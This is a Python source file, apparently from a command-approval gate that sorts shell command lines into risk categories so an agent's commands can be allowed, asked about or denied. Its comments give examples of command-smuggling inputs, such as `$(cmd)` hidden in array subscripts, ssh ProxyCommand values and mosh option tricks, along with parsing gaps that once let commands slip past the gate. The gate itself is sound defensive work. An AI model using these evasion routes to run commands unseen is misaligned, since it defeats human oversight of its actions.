# Those that also evaluate the value of a NAME=VALUE operand again (#188): a compound value `(..)` is parsed again
# as words even when quoted, and for the first three a -i value is arithmetic, a -n value a name. readonly and
# export never evaluate a name's subscript (`not a valid identifier`), have no -i, and their -n removes an attribute.
_DECLARES = ("declare", "typeset", "local", "readonly", "export")
_SCANS = {"$": _Lexer._dollar, "`": _Lexer._backtick}   # else <( ) or >( )


def _arith_scan(text: str, i: int, nested: bool = True, procsub: bool = False) -> tuple[int, list[str], bool]:
    """Read text from i as bash reads an arithmetic subscript: to the ] that ends it (a quote or \\ hides a ]), or
    to the end when not `nested`, outside any subscript. (end, the $( ) and ` ` bodies in it, and the <( ) ones
    with `procsub`, any expansion or quoting there.)"""
    lx, level, other, q, inner = _Lexer(text, scan=False), 1 if nested else 0, False, "", 0
    lx.i = i
    while lx.i < len(text) and (level or not nested):
        ch = text[lx.i]
        if ch == "`" or text.startswith(("$(", "${") + (("<(", ">(") if procsub else ()), lx.i):   # in any quoting
            _SCANS.get(ch, _Lexer._procsub)(lx, _Word())
            other = True
            continue
        if ch == "\\" and q != "'":   # a top-level \$ or \` is literal; bash < 5.2 expands a nested [ ] again
            lx.i += 1
            if text[lx.i:lx.i + 1] in ("$", "`") and (level > 1 or inner > 0):
                other = True
                continue
        elif ch in "'\"" and q in ("", ch):
            q, inner = ("" if q else ch), 0
        elif not q:
            level += {"[": 1, "]": -1}.get(ch, 0)
        elif q == '"':   # bash 3.2 reads a [ ] in double quotes as a nested subscript
            inner += {"[": 1, "]": -1}.get(ch, 0)
        other = other or ch in "\\'\"$"   # quoting or a variable: bash reads it, the gate does not
        lx.i += 1
    return lx.i, lx.subs, other


def _compound_scan(value: str, arith: bool) -> tuple[list[str], bool]:
    """A compound value `(..)` that declare parses again as words: the $( ), ` ` and <( ) bodies in it, read in
    any quoting, and whether it holds what bash evaluates again: an expansion or quoting in a `[key]=` subscript,
    or with -i (`arith`) an expansion in an element."""
    lx, q, start, other = _Lexer(value, scan=False), "", True, False
    lx.i = 1
    while lx.i < len(value):
        ch = value[lx.i]
        if start and ch == "[":
            lx.i, subs, odd = _arith_scan(value, lx.i + 1, procsub=True)
            lx.subs, other = lx.subs + subs, other or odd
        elif ch == "`" or value.startswith(("$(", "<(", ">("), lx.i):
            _SCANS.get(ch, _Lexer._procsub)(lx, _Word())
            other = other or arith
        else:
            if ch == "\\" and q != "'" and value[lx.i + 1:lx.i + 2] not in ("$", "`"):
                lx.i += 1
            elif ch in "'\"" and q in ("", ch):
                q = "" if q else ch
            other = other or (arith and ch == "$")
            lx.i += 1
        start = not q and ch in " \t\n"
    return lx.subs, other


def _subscript_parts(prog: str, words: list[_Word], cmd: str, depth: int, done: list[str],
                     late: list[Classification]) -> list[Classification]:
    """The commands inside the array subscripts of a name-taking builtin's name arguments, whatever their quoting
    (`done`: bodies the line's own parse already classified), and in the values declare evaluates again (into
    `late`, which the line adds after its own $( ) bodies, as it would for the same value unquoted). Any
    expansion there also asks: bash evaluates its value (a variable's, or a $( )'s output) as arithmetic or code
    too, and a value such as `b[$(cmd)]` runs cmd."""
    named, valued, operands = _NAME_BUILTINS[prog]
    args = [w.text for w in words]
    names, i, opts = [], 0, True
    attrs: set[str] = set()
    while i < len(args):
        a, i = args[i], i + 1
        if prog in ("test", "["):
            if a == "-v" and i < len(args):
                names.append((args[i], False))
            continue
        if opts and a == "--":
            opts = False
        elif opts and len(a) > 1 and a[0] in "-+":
            if prog in _DECLARES[:3]:
                attrs = attrs | set(a[1:]) if a[0] == "-" else attrs - set(a[1:])
            for n, letter in enumerate(a[1:], 2):
                if letter in named + valued:
                    val = a[n:] or (args[i] if i < len(args) else "")
                    i += 0 if a[n:] else 1
                    names += [(val, False)] if letter in named else []
                    break
        elif operands:
            names.append((a, words[i - 1].dynamic))
            opts = False
        else:
            break
    parts: list[Classification] = []
    # a body the line ran loses its \newlines too in a value bash reads again, but one that holds a single quote or
    # a here-document marker is compared as written (bash may keep its \newline), so a copy of it is read again
    done_set = set(done)
    bare = done_set | {re.sub(r"(?<!\\)((?:\\\\)*)\\\n", r"\1", d) for d in done
                       if "\\\n" in d and not re.search("'|<<", d)}
    for name, dynamic in names:
        m = re.match(r"[^=\[]*\[", name) if prog not in _DECLARES[3:] else None
        end, subs, other = _arith_scan(name, m.end()) if m else (name.find("="), [], False)
        value = re.match(r"\+?=(.*)", name[end:], re.S) if prog in _DECLARES and end >= 0 else None
        raw = value.group(1) if value else ""
        # a compound value is parsed again as words, and bash drops each \newline first (not an escaped
        # `\\<newline>`); an -i or -n value keeps it
        v, odd = re.sub(r"(?<!\\)((?:\\\\)*)\\\n", r"\1", raw) if raw.startswith("(") else raw, False
        more: list[str] = []
        if v.startswith("("):         # a compound value; one the line expanded is parsed again as code
            more, odd = _compound_scan(v, "i" in attrs)
            odd = odd or dynamic
        elif value and attrs & {"i", "n"}:   # arithmetic, or a name whose subscript runs when the nameref is used
            _, more, odd = _arith_scan(v, 0, nested=False)
        seen = bare if v != raw else done_set
        more = [sub for sub in more if sub not in seen]   # a command bash runs only as it reads the value again
        parts += [classify_shell(sub, depth + 1) for sub in subs if depth < _DEPTH and sub not in done_set]
        late += [classify_shell(sub, depth + 1) for sub in more if depth < _DEPTH]
        fresh = bool(more or set(subs) - done_set)   # commands the line's own parse did not see
        parts += [_too_deep(cmd)] if fresh and depth >= _DEPTH else []
        if other or odd or more:   # a signal, not an opaque part, so a deny on another part of the line still wins
            what = ("evaluates an array subscript the gate cannot read" if other else
                    "evaluates a value the gate cannot read" if odd else "runs a command in a value again")
            why = f"{prog} {what} ({name[:40]})"
            # `reread`: a command here may outrank a deny on the line, so naming opaque_exec does not lower this ask
            parts.append(_make("read", summary=why[:120], command=cmd,
                               signals=["indirection"] + (["reread"] if fresh else [])))
    return parts


def _classify_simple(k: _Cmd, cmd: str, depth: int, ctx: dict, piped: str | None = None) -> list[Classification]:
    """One simple command into its parts: the program's own category, the redirections, anything run
    inside it, and a store write when it touches the store."""
    words = list(k.words)
    while words and not words[0].quoted and words[0].text in _OPENERS:
        words = words[1:]
    loop: list[Classification] = []
    if words and not words[0].quoted and words[0].text == "for":
        loop = _indirect_sets("for", words, cmd)     # the loop variable: `for PATH in ...` sets PATH
        words = []                                   # a for header lists words, not programs
    before = words
    words, sudo, split = _strip_prefix_words(words)
    parts: list[Classification] = []
    if split is not None:
        parts.append(_opaque("env -S runs a command line", cmd))
        if depth < _DEPTH:
            parts.append(classify_shell(split, depth + 1))
    elif words:
        parts += _classify_program(words, k, cmd, depth, ctx, piped)
        if words[0].text in _NAME_BUILTINS and not words[0].dynamic:
            parts += _subscript_parts(words[0].text, words[1:] + k.operands, cmd, depth, ctx.get("subs", []),
                                      ctx.setdefault("late", []))
        parts += _exec_options(before, words, k, cmd, depth, ctx, piped)
    else:
        parts.append(_make("read", summary="shell assignment", command=cmd))
        parts += _exec_options(before, words, k, cmd, depth, ctx, piped) + loop
    if sudo:
        parts[0].signals.append("sudo")
        if parts[0].reversibility == "reversible":
            parts[0].reversibility = "costly"
    if k.heredocs:
        # dash and ash may end the body early and run the rest: read it as commands too. Once per line, under
        # _once's key for a shell reading it: a compound's heredoc reaches every command inside it.
        parts += _once(ctx, (classify_shell, depth + 1), k, None, lambda t: [
            classify_shell(t, depth + 1) if depth < _DEPTH else _too_deep(cmd)], True)
    for op, t in k.redirs:
        if op not in _WRITE_REDIRS or (op == ">&" and re.fullmatch(r"\d+|-", t.text)):
            continue
        dest = _expand_text(t.text)
        if dest in ("/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty"):
            continue
        if t.dynamic and "$" in dest:
            parts.append(_opaque(f"writes to a path from a variable ({t.text[:60]})", cmd))
        else:
            parts.append(_make("local_write", summary=f"write {t.text}"[:120], target=t.text, link=t.text, command=cmd))
    hit = _store_touch(k, words, parts, ctx)
    if hit:
        # #217: a descriptor path is a store write because the gate cannot see what it names, not because the
        # command is known to write there (`gh ... --body-file /dev/stdin` reads it), so the card says just that
        what = (f"uses {hit}, a descriptor path or folder the gate cannot resolve (it may lead to an Exo store file)"
                if _fd_path(hit) or _FD_DIR.fullmatch(os.path.normpath(hit)) else f"write to the Exo store: {hit}")
        c = _make("store_write", summary=what[:120], target=hit, link=hit, command=cmd)
        c.signals.append("exo store")
        parts.append(c)
    if any(w.locale for w in [*k.words, *(t for _, t in k.redirs), *k.herestrings]):
        # The words are classified as decoded, so category, target and vetoes still see them, but a message
        # catalog can replace them: the indirection signal asks unless opaque_exec is named.
        for p in parts:
            p.signals += ["indirection", "locale translation"]
    return parts


def _classify_program(words: list, k: _Cmd, cmd: str, depth: int, ctx: dict,
                      piped: str | None) -> list[Classification]:
    p = words[0]
    argv = [w.text for w in words]
    if p.dynamic or (not p.quoted and (p.glob or re.search(r"\{[^}]*(,|\.\.)[^}]*\}", p.text))):
        return [_opaque(f"program name comes from a variable or command output ({p.text[:40]})", cmd)]
    prog = p.text
    if prog.rsplit("/", 1)[-1] == "muse" and any(a in ("login", "auth", "logout") for a in argv[1:]):
        # The credential floor applies to launchers named by path too, before opaque path handling can hide it.
        return [_make("credentials", summary=f"muse {next(a for a in argv[1:] if a in ('login', 'auth', 'logout'))}",
                      command=cmd)]
    if "/" in prog:
        if not _trusted_path(prog):
            return [_opaque(f"runs a program by path ({prog[:60]})", cmd, target=prog)]
        prog = prog.rsplit("/", 1)[-1]
    prog = re.sub(r"^(python|pypy|pip)\d+(\.\d+)*$", r"\1", prog)
    argv[0] = prog
    sub = argv[1] if len(argv) > 1 else ""
    inner_depth = depth + 1

    def inner_words(ws: list) -> list[Classification]:
        if not ws:
            return []
        if depth >= _DEPTH:
            return [_too_deep(cmd)]
        return _classify_simple(_Cmd(words=ws, heredocs=k.heredocs, herestrings=k.herestrings), cmd,
                                inner_depth, ctx, piped)

    if prog in _WRAPPERS:
        return _classify_wrapper(prog, words, cmd, depth, inner_words)
    if prog in _OPAQUE_PROGRAMS:
        parts = [_opaque(f"{prog}: {_OPAQUE_PROGRAMS[prog]}", cmd)]
        if prog in ("coproc", "function"):
            # bash: `coproc [NAME] compound_command`, `function NAME compound_command`. The name is
            # skipped before a compound opener; before a simple command (`coproc w echo hi`) the first
            # word is the program. Keep the original words so quotes, expansion flags and stdin survive.
            body, alt = words[1:], []
            if len(body) > 1 and not body[1].quoted and body[1].text in _COMPOUND:
                if prog == "coproc" and (words[0].redir_after or body[0].redir_after):
                    # A redirection between `coproc`, the name and the opener: bash reads a simple command that
                    # runs the name (#207). The skipped reading stays too, so nothing it caught is lost.
                    alt = body
                body = body[1:]
            elif prog == "function":
                body = []                        # `function f() { ...; }`: the body is parsed as its own command
            parts += inner_words(body) + inner_words(alt)
            # An environment dump is credentials; classify_shell looks for one only in top-level commands.
            for ws in (body, alt):
                i = next((n for n, w in enumerate(ws) if w.quoted or w.text not in _OPENERS), len(ws))
                if _env_dump(_strip_prefixes_keep_env([w.text for w in ws[i:]])[0]):
                    parts.append(_make("credentials", summary="shell touching environment dump", command=cmd,
                                       signals=["secret store"]))
                    break
        if prog == "trap" and len(argv) > 1 and depth < _DEPTH:
            parts.append(classify_shell(argv[1], inner_depth))
        return parts
    if prog == "eval":
        parts = [_opaque("eval runs text as a command", cmd)]
        if depth < _DEPTH:
            parts.append(classify_shell(" ".join(argv[1:]), inner_depth))
        return parts
    if prog in _SHELLS:
        args = argv[1:]
        if args[:1] in (["--version"], ["--help"]):
            return [_make("read", summary=f"{prog} {args[0]}", command=cmd)]
        parts = [_opaque(f"{prog} runs shell commands", cmd)]
        for i, a in enumerate(args):
            if a == "-c" or (re.fullmatch(r"-[a-zA-Z]+", a) and "c" in a):
                if depth < _DEPTH:
                    parts.append(classify_shell(args[i + 1] if i + 1 < len(args) else "", inner_depth))
                return parts
            if not a.startswith(("-", "+")):
                parts[0].summary = f"{prog} runs the script {a}"[:120]
                return parts
        _runs_stdin(parts[0], k)
        if depth < _DEPTH:
            parts += _once(ctx, (classify_shell, inner_depth), k, piped, lambda t: [classify_shell(t, inner_depth)])
        return parts
    if prog in _INTERPRETERS:
        return _classify_interpreter(prog, argv, k, cmd, depth, ctx, piped)
    if prog == "xargs":
        i = 1
        while i < len(words) and words[i].text.startswith("-"):
            i += 2 if words[i].text in ("-I", "-n", "-P", "-L", "-s", "-d", "-E", "-a") else 1
        return [_runs_stdin(_opaque("xargs builds a command from its input", cmd), k)] + inner_words(words[i:])
    if prog == "find":
        parts = [_make("read", summary="find", command=cmd)]
        i = 1
        while i < len(words):
            if words[i].text in ("-exec", "-execdir", "-ok", "-okdir"):
                j = i + 1
                while j < len(words) and words[j].text not in (";", "+"):
                    j += 1
                parts += [_opaque(f"find {words[i].text} runs a command per file", cmd)] + inner_words(words[i + 1:j])
                i = j
            elif words[i].text == "-delete":
                parts.append(_make("delete", summary="find -delete", target=argv[1] if len(argv) > 1 else "",
                                   command=cmd))
            elif words[i].text in ("-fprint", "-fprint0", "-fprintf", "-fls"):
                parts.append(_make("local_write", summary=f"find {words[i].text}", command=cmd))
            i += 1
        return parts
    if prog in ("cd", "pushd"):
        target = next((w for w in words[1:] if not w.text.startswith("-")), None)
        dest = target.text if target else ""
        if target and _in_store_dir_words(_shell_words(target, ctx.setdefault("store_braces", {}), "dir")):
            ctx["store_cwd"] = True
            into = _expand_text(dest).strip()
            if _fd_path(into) or _FD_DIR.fullmatch(os.path.normpath(into or ".")):
                ctx.setdefault("fd_cwd", into)     # #217: the card names the descriptor folder, not "the store"
        return [_make("read", summary=f"{prog} {dest}".strip(), command=cmd)]
    if prog == "awk" or prog in ("gawk", "nawk", "mawk"):
        script = next((a for a in argv[1:] if not a.startswith("-")), "")
        if re.search(r"\bsystem\s*\(|\|\s*getline|\bprint[f]?\b[^;}]*(\||>)", script):
            return [_opaque("awk program runs commands or writes files", cmd)]
        return [_make("read", summary="awk", command=cmd)]
    if prog == "sed":
        scripts = _opts(argv, "-e", "--expression") or [a for a in argv[1:] if not a.startswith("-")][:1]
        if any(re.search(r"(^|[;{}\n])\s*[0-9,$/!]*\s*[ew](\s|$)|/[gpIiM0-9]*[ew]([\s;}]|$)", s) for s in scripts):
            return [_opaque("sed script runs a command or writes a file", cmd)]
        if _has(argv, "-i") or any(a.startswith("--in-place") for a in argv):
            return [_make("local_write", summary="sed -i", command=cmd)]
        return [_make("shell", summary="sed", command=cmd)]
    if prog == "git":
        return [_classify_git(argv, cmd)]
    if prog == "exo":
        return [_classify_exo(argv, cmd)]
    if prog == "gh":
        return [_classify_gh(argv, cmd, ctx.get("post_stdin"), frozenset(i for i, w in enumerate(words) if _expands(w)))]
    if prog in ("curl", "wget", "http", "https", "xh", "httpie"):
        return [_classify_http(argv, cmd, frozenset(i for i, w in enumerate(words) if _expands(w)),
                               k.piped_in or _own_stdin(k))]
    if prog in ("ssh", "mosh"):
        rest, i, moved, runs, here = argv[1:], 0, "", [], False
        # The host and command as the gate read them before D-075, for both programs.
        old = 0
        while old < len(rest) and rest[old].startswith("-"):
            old += 2 if rest[old] in _SSH_VALUE_OPTS_READ else 1
        old_tail = rest[old + 1:]
        old_dest, old_inner = (rest[old] if old < len(rest) else ""), " ".join(old_tail[old_tail[:1] == ["--"]:])
        if prog == "mosh":
            # mosh reads its options with Perl's Getopt::Long, not getopt (see _mosh_args); `--local` runs the
            # server and the command on this machine.
            rest, opts, bad = _mosh_args(rest)
            runs = [(o, v) for o, v in opts if o in ("ssh", "client", "server")]
            here = any(o == "local" for o, _ in opts)
            moved = f"{bad.partition('=')[0]}: not one of mosh's options" if bad else ""
            # Another option's value that reads as --server, --ssh or --client (`--port '--server=...'`): mosh
            # takes it as that value and does not run it, but the gate read it as a command before, so it still
            # does, and the line asks.
            for opt, val in opts:
                for o2, v2 in _mosh_args([val])[1] if val and opt not in ("ssh", "client", "server") else ():
                    if o2 in ("ssh", "client", "server"):
                        runs.append((o2, v2))
                        moved = moved or f"--{opt}: takes a value that reads as --{o2}"
        flags = ""
        if prog == "ssh":
            i, flags = _ssh_options(rest, 0)
        dest = rest[i] if i < len(rest) else ""
        host = _ssh_host(dest)
        tail = rest[i + 1:]
        if prog == "ssh" and tail[:1] == ["--"]:      # a `--` right after the host ends ssh's options
            tail = tail[1:]
        inner = " ".join(tail)
        if inner and depth >= _DEPTH:
            # A chain past the cap is not read, so it asks (#153). The hops that were read keep the
            # first host as target, so a `target:` deny on it still matches.
            c = _too_deep(cmd, "ssh chain nested too deep to read", dest)
            c.signals.append("unread hops")
        elif inner:
            c = classify_shell(inner, inner_depth)
        else:
            c = _make("shell", summary=f"ssh {dest}", command=cmd)
        if prog == "ssh" and _ssh_stdin_runs(words, k, piped, i, flags):
            # #240: the login shell on the host runs ssh's stdin. It is read as shell, as for `bash -s`, and asks.
            fed = [_runs_stdin(_opaque(f"ssh {dest} runs its stdin as commands on the remote host"[:120], cmd), k)]
            if depth < _DEPTH:
                fed += _once(ctx, (classify_shell, inner_depth), k, piped, lambda t: [classify_shell(t, inner_depth)])
            c = _combine([c, *fed], cmd)
        dests = [host, dest]
        if dest != old_dest:
            # The gate used to read another word as the host. The line asks and both readings' parts are
            # matched, so a line the old reading asked about or denied is not allowed now.
            moved = moved or f"{dest or 'no host'}: the gate used to read {old_dest or 'no word'} as the host"
            dests += [_ssh_host(old_dest), old_dest]
        elif old_inner != inner:
            # mosh took words after the host as its options or their values (`mosh host ls --port 'x; rm ..'`).
            # With POSIXLY_CORRECT set, Getopt::Long stops at the host and mosh runs them as the command, so
            # the old reading's parts are matched too and the line asks.
            moved = moved or f"{dest}: words after the host run as the command when POSIXLY_CORRECT is set"
        if old_inner and old_inner != inner and depth < _DEPTH:
            c = _combine([c, classify_shell(old_inner, inner_depth)], cmd)
        if moved:
            c = _combine([_opaque(f"{prog} {moved}", cmd), c], cmd)
        local = []
        for name, val in runs:                # mosh --ssh, --client, --server: a command it runs; it asks
            run = classify_shell(val, inner_depth) if val and depth < _DEPTH else _make("shell", command=cmd)
            if name == "server" and not here:  # the server helper runs on the remote host, like the inner command
                c = _combine([_opaque(f"mosh --{name}: runs a command", cmd), run, c], cmd)
            else:                             # the ssh and client helpers run here, and with --local the server
                local.append(_combine([_opaque(f"mosh --{name}: runs a command", cmd), run], cmd))
        # The hop is a part too, so a `target:<host>` entry matches when the inner command has its own target:
        # the bare host, and the destination as written when it carries a user, a scheme or a port.
        c.parts += [_make("shell", summary=f"ssh {dest}", target=t, command=cmd, signals=["remote host"])
                    for t in dict.fromkeys(dests) if t]
        if not here:                          # parts can be shared with a stored result (_own_copy): mark a copy
            c = copy.deepcopy(c)
        for p in _each_part(c) if not here else ():   # every part runs on the remote host (D-075)
            if EXPOSURE.index(p.exposure) < 1:
                p.exposure = "internal"
        if local:                             # local helpers keep their own exposure
            c = _combine(local + [c], cmd)
        c.target = dest if "unread hops" in c.signals else (c.target or dest)
        if not here:
            c.signals.append("remote host")
        return [c]
    if prog in ("vercel", "netlify"):
        if "login" in argv:
            return [_make("credentials", summary=f"{prog} login", command=cmd)]
        if "--prod" in argv or "--production" in argv or sub in ("promote", "alias"):
            return [_make("deploy_production", summary=f"{prog} production deploy", command=cmd)]
        if sub in ("", "deploy") or sub.startswith("-"):
            return [_make("deploy_preview", summary=f"{prog} preview deploy", command=cmd)]
        if sub in ("remove", "rm"):
            return [_make("delete", exposure="public", summary=f"{prog} remove", command=cmd)]
        return [_make("shell", summary=f"{prog} {sub}", command=cmd)]
    if prog == "stripe":
        joined = " ".join(argv[1:]).lower()
        if re.search(r"\b(create|confirm|capture|pay)\b", joined) and re.search(
                r"(charge|payment|payout|transfer|invoice|refund|subscription|checkout)", joined):
            amt = _opt(argv, "--amount", "-d")
            try:
                cost = float(re.sub(r"[^\d.]", "", amt.split("=")[-1])) if amt else None
            except ValueError:
                cost = None
            return [_make("payment", summary="Stripe payment", cost=cost, command=cmd)]
        return [_make("read", summary=f"stripe {sub}", command=cmd)]
    if prog in ("psql", "mysql", "sqlite3", "duckdb") and _SQL_DESTRUCTIVE.search(" ".join(argv[1:])):
        return [_make("delete", summary=f"destructive SQL via {prog}", command=cmd)]
    if prog == "rsync" and _has(argv, "--delete", "--delete-after", "--delete-before", "--remove-source-files"):
        return [_make("delete", summary="rsync with delete", command=cmd)]
    if prog == "mv" and len(argv) > 2 and argv[-1] in ("/dev/null",):
        return [_make("delete", summary="move to /dev/null", command=cmd)]
    if prog in ("chmod", "chown", "chflags"):
        if any(".ssh" in a or a.endswith((".pem", ".key")) for a in argv):
            return [_make("credentials", summary=f"{prog} on key material", command=cmd)]
        return [_make("shell", summary=prog, command=cmd)]
    if prog == "crontab":
        if _has(argv, "-l"):
            return [_make("read", summary="crontab -l", command=cmd)]
        return [_opaque("crontab changes scheduled jobs", cmd)]
    if (prog, sub) in SUBCOMMANDS:
        return [_make(SUBCOMMANDS[(prog, sub)], summary=f"{prog} {sub}", command=cmd)]
    if prog in PROGRAMS:
        cat = PROGRAMS[prog]
        target = next((a for a in reversed(argv[1:]) if not a.startswith("-")), "")
        c = _make(cat, summary=f"{prog} {target}".strip() if cat == "delete" else prog,
                  target=target if cat == "delete" else "", link=target if cat == "delete" else "", command=cmd)
        if prog == "rm" and _has(argv, "-r", "-R", "--recursive") and _has(argv, "-f", "--force"):
            c.signals.append("recursive force delete")
        return [c]
    if (prog, sub) in _RUN_WRAPPERS:
        i = 2
        while i < len(words) and words[i].text.startswith("-"):
            f = words[i].text
            i += 1
            if f == "--":
                break
            if f in _WRAPPER_VALUE_OPTS and "=" not in f:
                i += 1
        return inner_words(words[i:]) or [_make("shell", summary=f"{prog} run", command=cmd)]
    if prog in TOOL_SUBCOMMANDS:
        if prog == "uv" and sub == "tool" and argv[2:3] == ["run"]:
            return [_opaque("uv tool run downloads and runs a tool", cmd)]
        if (sub or "_") in TOOL_SUBCOMMANDS[prog] or (prog == "yarn" and not sub):
            return [_make("shell", summary=f"{prog} {sub}".strip(), command=cmd)]
        return [_opaque(f"{prog} {sub} runs project scripts or code the gate cannot see".strip(), cmd)]
    if prog == "hash" and (rebind := _hash_rebind(words)):     # `hash -p` rebinds a name to another file (#330)
        return [_opaque(rebind[0], cmd, target=rebind[1], rebinds=True)]
    if prog in READ_PROGRAMS:
        return [_make("read", summary=prog, command=cmd)]
    if prog in SHELL_PROGRAMS:
        return [_make("shell", summary=" ".join(argv[:3])[:80], command=cmd)]
    return [_opaque(f"runs {prog}, a program the gate does not know", cmd, signal="unknown program")]


def _option_values(argv: list[str], names: tuple, start: int = 1, takes: str = "", longs: tuple = (),
                   operands: int | None = None, least: int = 3, wild: frozenset = frozenset()) -> list[str]:
    """The values given to the options `names` in argv[start:], read as getopt reads them (#154). In a short
    option cluster the first letter that takes a value (one of `names`, or a letter in `takes`) ends the word:
    its value is the rest of the word or the next word (`-xIzstd`, `-avze ssh`, `-oProxyCommand=cmd`). A long
    option takes `=value`, or the next word when it is in `longs`, is one of `names` or abbreviates one in
    `least` characters or more (`--to-com cmd`). A name of more than one letter after one dash (`-TT`, `-cmd`)
    is a whole word. Options end at `--`, and with `operands` at the operand after that many: ssh reads options
    before and after its destination, and the remote command follows. An operand at an index in `wild` may
    expand to no word or several (`$A`, `"$@"`, a glob), so the operands cannot be counted and every word is
    read."""
    shorts = "".join(n[1] for n in names if len(n) == 2)
    whole = [n for n in names if len(n) > 2 and not n.startswith("--")]
    long_names = [n for n in names if n.startswith("--")]
    out: list[str] = []
    i, seen = start, 0
    while i < len(argv):
        a = argv[i]
        i += 1
        key, eq, val = a.partition("=")
        if a == "--":
            break
        if key in whole:
            if eq or i < len(argv):
                out.append(val if eq else argv[i])
                i += 0 if eq else 1
        elif a.startswith("--"):
            hit = any(n == key or (len(key) >= least and n.startswith(key)) for n in long_names)
            if eq and hit:
                out.append(val)
            elif not eq and (hit or key in longs) and i < len(argv):
                if hit:
                    out.append(argv[i])
                i += 1
        elif a == "-" or not a.startswith("-"):
            if i - 1 in wild:
                operands = None
            if operands is not None:
                if seen >= operands:
                    break
                seen += 1
        else:
            for j, ch in enumerate(a[1:], 2):
                if ch in shorts or ch in takes:
                    value = a[j:]
                    if not value and i < len(argv):
                        value, i = argv[i], i + 1
                    if ch in shorts:
                        out.append(value)
                    break
    return out


def _ssh_options(args: list[str], i: int, after: bool = False) -> tuple[int, str]:
    """Where ssh's options from args[i] end, and the letters of its flags among them. Short options cluster as in
    getopt: the first letter that takes a value ends the word, and the value is the rest of it or the next word
    (`-vp 22`, `-oPort=22`, `-B eth0`). Before the host a word starting with `--` is passed over, as the gate has
    read it since D-075. After the host (`after`) ssh reads options again, up to its remote command, and `--`
    ends them."""
    letters = ""
    while i < len(args) and args[i].startswith("-") and not (after and args[i] == "-"):
        w = args[i]
        i += 1
        if w.startswith("--"):
            if after and w == "--":
                break
            continue
        v = next((j for j, ch in enumerate(w[1:], 1) if ch in _SSH_VALUE_OPTS), 0)
        letters += w[1:v or None]
        if v and v == len(w) - 1:
            i += 1
    return i, letters


def _ssh_stdin_runs(words: list, k: _Cmd, piped: str | None, i: int, flags: str) -> bool:
    """Whether the login shell on the remote host runs ssh's stdin as commands (#240). That takes a stdin the line
    gives ssh (a pipe, a heredoc, a here-string, a `<` from anything but /dev/null), none of `-n`, `-N` and `-f`
    (ssh then does not read it) and no remote command: ssh reads options after the host too (`ssh host -T`), up
    to the command, and an empty word is no command. A word that may expand to no word or several (`$A`, a glob)
    among the options and the host, or as every word of the command, leaves them uncountable, so the stdin is read
    then too. `words` is ssh's argv as words; `i` is the host's index in words[1:], `flags` the letters before it."""
    if not (k.piped_in or piped is not None or k.heredocs or k.herestrings
            or any(op in _READ_REDIRS and not (op == "<" and t.text == "/dev/null") for op, t in k.redirs)):
        return False
    texts = [w.text for w in words[1:]]
    wild = [w.dynamic or (not w.quoted and (w.glob or bool(re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))
            for w in words[1:]]
    j, late = (i + 1, "") if "--" in texts[:i] else _ssh_options(texts, i + 1, after=True)
    if any(wild[:j]):
        return True
    return not set(flags + late) & set("nNf") and (" ".join(texts[j:]) == "" or all(wild[j:]))


def _ssh_setting(text: str) -> tuple[str, str]:
    """An ssh `-o` setting split as ssh's readconf splits it: (keyword in lower case, the command value). Leading
    whitespace is skipped; the keyword may be quoted and ends at whitespace, a quote or `=`; a command value is
    the rest of the line after whitespace and `=` (`ProxyCommand = cmd`, `"ProxyCommand" cmd`, `proxycommand=cmd`)."""
    s = text.lstrip(" \t\r\n=")
    m = re.search(r"[ \t\r\n\"=]", s)
    if not m:
        return s.lower(), ""
    j = m.start()
    if s[j] == '"':                                  # the quote is dropped and the keyword runs to the next one
        s = s[:j] + s[j + 1:]
        k = s.find('"', j)
        if k < 0:
            return "", ""                            # ssh rejects an unclosed quote
        key, rest = s[:k], s[k + 1:]
    else:
        key, rest = s[:j], s[j:]
    return key.lower(), rest.lstrip(" \t\r\n=")


def _indirect_sets(prog: str, words: list, cmd: str) -> list[Classification]:
    """Variables a builtin sets to a value the gate does not see: the names `read` (also `-a`) and
    `printf -v` fill, the target of a nameref (`declare -n r=PATH`), and an exporter argument whose name
    comes from a variable (`export $X=...`). A variable _env_hazard lists is opaque, named, and so is a
    name the gate cannot read. A for-loop variable comes here from _classify_simple with prog "for"."""
    args, targets, parts = words[1:], [], []
    if prog == "for":
        targets = args[:1]
    elif prog == "read":
        i = 0
        while i < len(args) and args[i].text.startswith("-") and args[i].text != "-":
            t, i = args[i].text, i + 1
            if t == "--":
                break
            for j, ch in enumerate(t[1:], 1):
                if ch in "adinNptu":                 # the options that take a value; -a names an array
                    val = _Word(text=t[j + 1:], dynamic=args[i - 1].dynamic) if t[j + 1:] else \
                        (args[i] if i < len(args) else None)
                    i += 0 if t[j + 1:] else 1
                    if ch == "a" and val is not None:
                        targets.append(val)
                    break
        targets += args[i:]
    elif prog == "printf" and args[:1] and args[0].text.startswith("-v"):
        targets = [_Word(text=args[0].text[2:], dynamic=args[0].dynamic)] if args[0].text != "-v" else args[1:2]
    elif prog in _EXPORTERS:
        i, flags = 0, ""
        while i < len(args) and args[i].text[:1] in "-+" and len(args[i].text) > 1:
            if args[i].text == "--":
                i += 1
                break
            flags += args[i].text[1:] if args[i].text[0] == "-" else ""
            i += 1
        if "f" in flags or "F" in flags:                  # names functions, not variables
            return []
        if "p" in flags and prog in ("declare", "typeset", "local"):  # prints; export/readonly -p still assign
            return []
        for w in args[i:]:
            name, (_, sep, ref) = re.split(r"\[|\+?=", w.text, maxsplit=1)[0], w.text.partition("=")
            if _unreadable_name(w):
                targets.append(w)
            elif "n" in flags and prog != "export":     # a nameref: what it points at is what gets set
                if not sep:
                    parts.append(_opaque(f"{prog} -n {name} makes a reference the gate cannot follow"[:120], cmd))
                else:
                    targets.append(_Word(text=ref, dynamic=w.dynamic))
    for w in targets:
        name = re.split(r"\[|\+?=", w.text, maxsplit=1)[0]
        if _unreadable_name(w):
            parts.append(_opaque(f"{prog} sets a variable whose name the gate cannot read", cmd))
        elif why := _env_hazard(name):
            parts.append(_opaque(f"{name} {why} (set by {prog})", cmd, rebinds=name in _REBIND_VARS))
        parts += [_opaque(f"{n} {why} (set in a subscript)", cmd, rebinds=n in _REBIND_VARS)  # `read 'a[PATH=1]'`
                  for n in _subscript_sets(w.text) if (why := _env_hazard(n))]
    return parts


def _exec_options(before: list, words: list, k: _Cmd, cmd: str, depth: int, ctx: dict,
                  piped: str | None) -> list[Classification]:
    """Commands a trusted program is told to run (#154): an exec option (`tar --to-command`, `rsync -e`,
    `man -P`, `git rebase -x`...), an ssh `-o ProxyCommand`, a sqlite3/psql shell command, or an environment variable
    such as GIT_SSH_COMMAND set before the program. Each is classified as a nested command; a value the
    gate cannot read (a script file, `.output FILE`) is opaque, and so is a variable that loads code or
